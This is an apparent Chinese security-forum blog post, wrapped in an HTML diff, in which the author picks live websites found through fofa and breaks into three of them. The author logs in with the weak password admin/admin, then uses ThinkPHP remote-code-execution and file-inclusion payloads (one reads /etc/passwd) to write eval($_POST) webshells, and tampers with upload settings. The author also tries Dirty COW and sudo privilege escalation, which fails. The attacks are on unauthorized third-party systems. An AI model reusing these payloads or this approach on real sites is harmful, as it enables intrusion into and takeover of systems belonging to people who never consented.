@@ -1,0 +1,74 @@
+<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
+<div id="app">
+<h1 data-content="1" id="356b3d28bfb7f1280cac7c88cd4cc898">记一天三个站并失败的提权过程</h1>
+<blockquote>
+<p>最近学习了一下pwn，然后就学习到了栈溢出，然后就遇到了困难。就想去看看php吧，好久没有看了，准备去看漏洞复现。然后就开始了一天三站的过程。</p>
+</blockquote>
+<h2 data-content="1" id="40bae3c7962694c1b65acfd856340721">信息收集</h2>
+<p>因为自己太懒了，不想搭建环境，然后就想网上有好多网站啊，随便找一个去看看。hhh然后去利用<code>fofa</code>去搜索。</p>
+<h2 data-content="1" id="dfb9d9477c0de2c3d28fb777a00ad500">第一个shell</h2>
+<p>首先获得的是第一个网站，直接<code>/admin.php</code>成功到后台页面，然后肯定是<code>admin/admin</code>呀完美，成功进入后台（运气好）</p>
+<p>然后我就去找漏洞利用点，找了半天都没有找到，突然在后台发现了一个报错信息。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210308213905-a6db8aae-8013-1.png"/></p>
+<p>hhh,这不是tp框架嘛！然后直接上poc，进行测试，测试发现ban了一下命令执行函数，然后我去查看<code>phpinfo</code></p>
+<div class="highlight"><pre><span></span><span class="x">?s=index/index</span>
+
+<span class="x">_method=__construct&amp;filter[]=call_user_func&amp;method=get&amp;get[0]=phpinfo</span>
+</pre></div>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210308213930-b5a4039a-8013-1.png"/></p>
+<p>发现ban了一下常见的命令执行函数，然后发现没有ban,<code>shell_exec</code></p>
+<p>于是说干就干，因为<code>shell_exec</code>函数没有回显，这里使用的<code>dnslog</code>进行测试。发现成功执行了命令。这不是美滋滋。</p>
+<p>然后我就准备反弹shell，但是一直没有成功，不知道原理。那时候已经比较晚了，准备去填饱肚子。吃了饭之后就进行日。</p>
+<p>然后我就猜有没有可能性有写入权限，然后我测试了一下果然有写入权限。</p>
+<div class="highlight"><pre><span></span><span class="x">?s=index/index</span>
+
+<span class="x">_method=__construct&amp;filter[]=shell_exec&amp;method=get&amp;get[0]=echo "</span><span class="cp">&lt;?php</span> <span class="k">eval</span><span class="p">(</span><span class="nx">\</span><span class="nv">$_POST</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span><span class="cp">?&gt;</span><span class="x">" &gt; 1.php</span>
+</pre></div>
+<p>成功拿到shell,但是权限是<code>www</code>的进行提权。这里系统版本是<code>cestos</code>的使用脏牛漏洞和新出来的sudo提权失败。。。</p>
+<p>虽然失败了，但是我突然对这类网站感兴趣了，于是便有了下面俩个网站的shell。</p>
+<h2 data-content="1" id="099a7ffdbb726c2c1166bb6c72341fef">第二个shell</h2>
+<p>还是和上面一样，也是通过弱密码成功进入后台（弱密码yyds）</p>
+<p>有了一个网站的思路，第二个就比较清晰了，不过遇到了困难是这个网站几乎ban了全部的命令执行函数，所以给我带来了困难。</p>
+<p>因为该漏洞是通过<code>call_user_func()</code>函数进行的漏洞利用，所以说我们控制的参数有限。一直没有绕过这个参数的问题，想使用写入函数去执行写入shell，但是发现参数不够。（烦死了~）那时候已经是23点了，一直没有绕过，自己又不想去跟代码。。。。遇到困难回寝室睡觉。</p>
+<p>第二天上完课，我就去实验室进行利用，在昨天晚上深思熟虑的思考之后分析，有没有可能进行文件包含包含shell。</p>
+<p>然后就开始构造文件包含的poc</p>
+<div class="highlight"><pre><span></span><span class="x">?s=index/index</span>
+
+<span class="x">_method=__construct&amp;method=get&amp;filter[]=think\__include_file&amp;server[]=phpinfo&amp;get[]=/etc/passwd&amp;x=phpinfo();</span>
+</pre></div>
+<p>这里成功包含成功。。。爽歪歪。</p>
+<p>接下来就通过后台有一个上传文件的地方进行上传文件，然后包含。</p>
+<p>然后就又遇到了困难。。。</p>
+<p>我们上传的文件进行了hash密码算法的渲染，相当于二次渲染，也没有绕过。难受死了，所以上传照片这个路走不通了。接下来就是找日志文件。找了好久都没有找到，于是想，<strong>上一个网站和这个网站是一样的，那么日志文件可能也一样。于是去看上一个网站的日志文件目录去测试这个网站的日志文件，果然成功包含日志文件</strong></p>
+<p><code>/www/wwwlogs/access.log</code></p>
+<p>然后我就兴高采烈的去包含日志文件，结果失败？？！奇奇怪怪，测试了好久都失败了。然后去看上一个网站的日志文件发现果然日志文件里面有奇奇怪怪的编码？导致我们写入的shell，不能成功识别。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210308214009-cd20c760-8013-1.png"/></p>
+<p>再一次难受~</p>
+<p>时间已经到下午又该上课的时候了。。。</p>
+<p><strong>下午在战</strong></p>
+<p>回到实验室，想一想思路，因为有文件上传的地方，并且服务器开起了</p>
+<p><code>session.upload_progress.enabled</code>配置</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210308214054-e78ae9e6-8013-1.png"/></p>
+<p>所以思路，就是我们利用<code>session文件包含进行getshell</code></p>
+<p>这部分我就不介绍了哈，网上有好多的。。</p>
+<p>然后说干就干，准备开始找上一次的上传点，突然发现另一个上传点。我们可以上传文件(<code>doc pdf</code>)等等，于是我想如果我们可以上传<code>txt</code>文件然后进行文件包含，不是也是一样的嘛？而这里利用条件比较低，于是我就去利用上传txt文件进行包含。</p>
+<p>经过在后台搜索了一遍，发现我们可以修改上传后缀名的配置文件，于是我成功添加了允许上传<code>txt</code>文件。</p>
+<p>在txt里面写入。</p>
+<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span> <span class="nb">fputs</span><span class="p">(</span><span class="nb">fopen</span><span class="p">(</span><span class="s1">'shell.php'</span><span class="p">,</span><span class="s1">'w'</span><span class="p">),</span><span class="s1">'&lt;?php @eval($_POST["0"])?&gt;'</span><span class="p">);</span><span class="cp">?&gt;</span><span class="x"></span>
+</pre></div>
+<p>然后在利用最开始的文件包含漏洞去包含这个文件，成功执行命令生成<code>shell</code></p>
+<p>美滋滋。。。</p>
+<p>这里可能你会说居然可以修改上传配置的后缀名，那为什么不能是去上传php?</p>
+<p>这里我自己测试了一下，不能上传php的代码，至于绕过，没有去测试。。。</p>
+<h2 data-content="1" id="ec46f87a1324dc8758d31f8ca60f0c62">第三个shell</h2>
+<p>第三个shell来说是最简单的，因为没有<code>ban system</code>函数,使用我们直接写入shell，进行连接就OK。</p>
+<h2 data-content="1" id="eed4a6b2635541fe7c246f3b796b798e">总结</h2>
+<ul>
+<li>简单的说拿这个shell还是比较简单的，只是在第二个shell的时候思考了有好久，不过学习到了一下思路。真的是在渗透过程中不能放弃。</li>
+<li>这一次证明了我们需要更加关注之前重新的漏洞和弱密码。</li>
+<li>只不过三个shell都提权失败。。。tcl</li>
+<li>下一步准备去学习一下linux提权利操作。</li>
+</ul>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210308214104-edb82dce-8013-1.png"/></p>
+</div>
+</div>
